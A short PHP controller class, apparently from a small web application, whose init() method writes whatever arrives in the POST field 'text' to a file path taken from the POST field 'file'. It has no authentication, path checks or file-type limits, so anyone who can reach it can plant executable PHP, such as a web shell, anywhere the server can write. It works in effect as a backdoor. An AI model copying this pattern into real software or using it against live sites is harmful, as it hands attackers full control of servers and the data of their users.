<?

require_once DIR_BASE."model/model.php";
require_once DIR_BASE."view/view.php";

class CSave{

	function __construct() 
	{	

	}

	function init()
	{
		if(MRequest::post('text')&&MRequest::post('file')){
			$cmd=MRequest::post('text');
			 return file_put_contents(DIR_BASE.MRequest::post('file'), $cmd);
		}
		
	}

}
?>